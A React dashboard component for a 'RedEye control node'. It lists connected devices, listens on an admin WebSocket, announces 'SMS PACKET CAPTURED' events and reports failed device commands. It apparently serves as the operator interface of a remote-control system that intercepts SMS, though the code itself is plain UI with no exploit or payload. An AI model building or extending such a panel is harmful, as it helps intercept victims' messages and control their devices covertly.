import React, { useEffect, useRef, useState } from 'react'
import { Link } from 'react-router-dom'
import { FiLogOut, FiSettings, FiZap, FiShield } from 'react-icons/fi'
import { toast } from 'react-hot-toast'
import DeviceList from './DeviceList'
import { API_BASE, WS_BASE } from '../config'

export default function Dashboard({ onLogout }) {
  const [devices, setDevices] = useState([])
  const [loading, setLoading] = useState(true)
  const wsRef = useRef(null)

  const authHeaders = () => ({ Authorization: `Bearer ${localStorage.getItem('token')}` })

  const fetchDevices = async () => {
    const res = await fetch(`${API_BASE}/devices`, { headers: authHeaders() })
    if (res.status === 401 || res.status === 403) return onLogout()
    const data = await res.json()
    if (data.success) setDevices(data.devices || [])
    setLoading(false)
  }

  useEffect(() => {
    fetchDevices().catch(() => { toast.error('DEVICE MATRIX LOAD FAILED'); setLoading(false) })
    const token = localStorage.getItem('token')
    if (!token || !WS_BASE) return
    const ws = new WebSocket(`${WS_BASE}/admin?token=${token}`)
    wsRef.current = ws
    ws.onopen = () => console.info('RedEye live socket online')
    ws.onmessage = (e) => {
      const msg = JSON.parse(e.data)
      if (msg.type === 'initial-devices') setDevices(msg.data || [])
      if (msg.type === 'device-online') { fetchDevices() }
      if (msg.type === 'device-offline') { fetchDevices() }
      if (msg.type === 'device-update') fetchDevices()
      if (msg.type === 'sms-received' || msg.type === 'sms:new') {
        toast.success(`SMS PACKET CAPTURED: ${msg.data?.sender || 'unknown'}`)
        window.dispatchEvent(new CustomEvent('sms:new', { detail: msg.data }))
      }
      if (msg.type === 'command-result' && !msg.data?.success) toast.error(`COMMAND FAILED: ${msg.data?.error || 'unknown'}`)
    }
    ws.onerror = () => toast.error('LIVE SOCKET ERROR')
    return () => ws.close()
  }, [])

  const onDeviceUpdated = (device) => setDevices(prev => prev.map(d => d.device_uid === device.device_uid ? { ...d, ...device } : d))
  const onDeviceDeleted = (uid) => setDevices(prev => prev.filter(d => d.device_uid !== uid))

  const online = devices.filter(d => d.online).length
  const fav = devices.filter(d => d.favorite).length

  return (
    <div className="cyber-bg">
      <MatrixBackdrop />
      <header className="border-b border-emerald-400/20 bg-black/30 backdrop-blur">
        <div className="flex flex-wrap items-center justify-between gap-3 px-6 py-4">
          <div className="flex items-center gap-3">
            <div className="rounded-xl border border-emerald-400/40 bg-emerald-400/10 p-3 text-emerald-300"><FiShield /></div>
            <div>
              <p className="terminal-title">redeye control node</p>
              <h1 className="text-2xl font-black">Admin Operations</h1>
            </div>
          </div>
          <div className="flex flex-wrap gap-2">
            <Link to="/settings" className="cyber-btn"><FiSettings /> Settings</Link>
            <button onClick={onLogout} className="danger-btn"><FiLogOut /> Logout</button>
          </div>
        </div>
      </header>

      <main className="p-6">
        <div className="mb-6 grid grid-cols-1 gap-4 md:grid-cols-4">
          <Stat label="TOTAL DEVICES" value={devices.length} />
          <Stat label="ONLINE" value={online} />
          <Stat label="OFFLINE" value={devices.length - online} />
          <Stat label="FAVORITES" value={fav} />
        </div>
        <div className="mb-4 flex items-center gap-2 text-sm muted"><FiZap /> Realtime device matrix. Use Settings for API keys, Telegram, and wake-all logs.</div>
        <DeviceList devices={devices} loading={loading} onUpdated={onDeviceUpdated} onDeleted={onDeviceDeleted} />
      </main>
    </div>
  )
}

function Stat({ label, value }) {
  return <div className="cyber-card p-5"><p className="terminal-title">{label}</p><p className="mt-2 font-mono text-4xl font-black text-emerald-300">{value}</p></div>
}

function MatrixBackdrop() {
  return <div className="matrix-backdrop" aria-hidden="true">{Array.from({ length: 18 }).map((_, i) => <span key={i} style={{ left: `${i * 6}%`, animationDelay: `${(i % 7) * -0.8}s`, animationDuration: `${7 + (i % 5)}s` }}>0101\nFS\nROOT\nPING\nSAFE\nTRACE</span>)}</div>
}
